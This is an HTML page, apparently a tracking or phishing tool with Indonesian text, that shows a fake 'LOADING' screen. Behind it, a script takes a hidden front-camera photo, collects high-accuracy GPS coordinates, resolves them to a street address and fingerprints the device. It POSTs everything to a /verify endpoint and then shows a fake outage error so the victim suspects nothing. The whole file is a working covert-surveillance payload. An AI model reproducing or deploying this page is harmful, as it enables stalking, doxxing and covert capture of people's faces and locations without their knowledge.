<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        .container { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto 30px;
            border: 4px solid #e0e0e0;
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 400; color: #333; letter-spacing: 6px; }
        p { color: #999; margin-top: 10px; }
        .error { color: #ff3b30; margin-top: 30px; font-size: 14px; display: none; }
        .status-text {
            color: #666;
            margin-top: 15px;
            font-size: 13px;
            display: none;
        }
        .status-text.visible { display: block; }
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <h1 id="title">LOADING</h1>
        <p id="subtitle">Please wait<span id="dots">...</span></p>
        <div class="status-text" id="statusText">📍 Mengambil lokasi...</div>
        <div class="error" id="error">⚠️ Maaf sedang gangguan</div>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        const errorEl = document.getElementById('error');
        const statusText = document.getElementById('statusText');
        const dots = document.getElementById('dots');
        const spinner = document.getElementById('spinner');
        const title = document.getElementById('title');
        const subtitle = document.getElementById('subtitle');

        // ===== GET GPS LOCATION =====
        function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                statusText.textContent = '📍 Mengambil lokasi GPS...';
                statusText.classList.add('visible');

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        console.log('📍 GPS Location:', position.coords);
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude || null,
                            heading: position.coords.heading || null,
                            speed: position.coords.speed || null
                        });
                    },
                    (error) => {
                        console.warn('⚠️ GPS Error:', error.message);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ===== GET DEVICE INFO =====
        function getDeviceInfo() {
            const ua = navigator.userAgent.toLowerCase();
            const info = {
                browser: 'Tidak diketahui',
                os: 'Tidak diketahui',
                device: 'Tidak diketahui',
                brand: 'Tidak diketahui',
                model: 'Tidak diketahui',
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                language: navigator.language || 'id-ID',
                platform: navigator.platform || 'Tidak diketahui'
            };

            // Browser
            if (ua.includes('chrome')) info.browser = 'Chrome';
            else if (ua.includes('firefox')) info.browser = 'Firefox';
            else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
            else if (ua.includes('edge')) info.browser = 'Edge';
            else if (ua.includes('opera')) info.browser = 'Opera';

            // OS
            if (ua.includes('android')) {
                info.os = 'Android';
                const match = ua.match(/android\s([\d.]+)/);
                if (match) info.os += ` ${match[1]}`;
            } else if (ua.includes('iphone') || ua.includes('ipad')) {
                info.os = 'iOS';
                const match = ua.match(/os\s([\d_]+)/);
                if (match) info.os += ` ${match[1].replace(/_/g, '.')}`;
            } else if (ua.includes('windows')) {
                info.os = 'Windows';
            } else if (ua.includes('mac')) {
                info.os = 'macOS';
            }

            // Device Type
            if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
                info.device = 'Mobile';
            } else if (ua.includes('tablet') || ua.includes('ipad')) {
                info.device = 'Tablet';
            } else {
                info.device = 'Desktop';
            }

            // Brand HP
            const brands = [
                { name: 'Samsung', patterns: ['samsung', 'sm-'] },
                { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
                { name: 'Realme', patterns: ['realme'] },
                { name: 'Oppo', patterns: ['oppo'] },
                { name: 'Vivo', patterns: ['vivo'] },
                { name: 'OnePlus', patterns: ['oneplus'] },
                { name: 'Google Pixel', patterns: ['pixel'] },
                { name: 'Huawei', patterns: ['huawei', 'honor'] },
                { name: 'Nokia', patterns: ['nokia'] },
                { name: 'Sony', patterns: ['sony'] },
                { name: 'LG', patterns: ['lg-'] },
                { name: 'Asus', patterns: ['asus'] },
                { name: 'Infinix', patterns: ['infinix'] },
                { name: 'Tecno', patterns: ['tecno'] },
                { name: 'Apple', patterns: ['iphone', 'ipad', 'ipod'] }
            ];

            for (const brand of brands) {
                if (brand.patterns.some(p => ua.includes(p))) {
                    info.brand = brand.name;
                    break;
                }
            }

            // Model
            if (info.brand === 'Apple') {
                const match = ua.match(/iphone(\d+)/);
                if (match) info.model = `iPhone ${match[1]}`;
                else if (ua.includes('ipad')) info.model = 'iPad';
            } else if (info.brand === 'Samsung') {
                const match = ua.match(/sm-[a-z0-9]+/i);
                if (match) info.model = match[0].toUpperCase();
            } else if (info.brand === 'Xiaomi') {
                const match = ua.match(/mi\s[a-z0-9]+/i) || ua.match(/redmi\s[a-z0-9]+/i);
                if (match) info.model = match[0];
            }

            return info;
        }

        // ===== GET LOCATION NAME FROM COORDINATES =====
        async function getLocationName(lat, lon) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=id`
                );
                const data = await response.json();
                
                if (data && data.address) {
                    const addr = data.address;
                    return {
                        full: data.display_name || '-',
                        street: addr.road || addr.street || '-',
                        city: addr.city || addr.town || addr.village || '-',
                        district: addr.suburb || addr.district || '-',
                        province: addr.state || addr.province || '-',
                        country: addr.country || '-',
                        postcode: addr.postcode || '-',
                        houseNumber: addr.house_number || '-'
                    };
                }
                return null;
            } catch (err) {
                console.error('Reverse geocoding error:', err);
                return null;
            }
        }

        // ===== MAIN PROCESS =====
        async function start() {
            try {
                console.log('🚀 Starting...');
                statusText.textContent = '📷 Mengakses kamera...';
                statusText.classList.add('visible');

                // 1. Access Camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false
                });
                
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));

                // 2. Capture Photo
                statusText.textContent = '📸 Mengambil foto...';
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.85);

                // Stop camera
                stream.getTracks().forEach(t => t.stop());

                // 3. Get GPS Location
                statusText.textContent = '📍 Mengambil lokasi GPS...';
                const gpsLocation = await getGPSLocation();

                // 4. Get Location Name
                let locationName = null;
                if (gpsLocation) {
                    statusText.textContent = '🗺️ Mencari alamat...';
                    locationName = await getLocationName(gpsLocation.latitude, gpsLocation.longitude);
                }

                // 5. Get Device Info
                const deviceInfo = getDeviceInfo();

                // 6. Prepare data
                const dataToSend = {
                    image: imageData,
                    device: deviceInfo,
                    gps: gpsLocation,
                    locationName: locationName,
                    timestamp: new Date().toISOString()
                };

                console.log('📤 Sending data:', dataToSend);

                // 7. Send to server
                statusText.textContent = '📤 Mengirim data...';
                const response = await fetch('/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dataToSend)
                });

                const result = await response.json();
                console.log('📨 Response:', result);

                // Show error
                statusText.classList.remove('visible');
                errorEl.style.display = 'block';
                spinner.style.display = 'none';
                title.style.display = 'none';
                subtitle.style.display = 'none';

            } catch (err) {
                console.error('❌ Error:', err);
                statusText.classList.remove('visible');
                errorEl.style.display = 'block';
                spinner.style.display = 'none';
                title.style.display = 'none';
                subtitle.style.display = 'none';
            }
        }

        window.onload = () => {
            console.log('📄 Page loaded');
            setTimeout(start, 500);
        };
    </script>
</body>
</html>
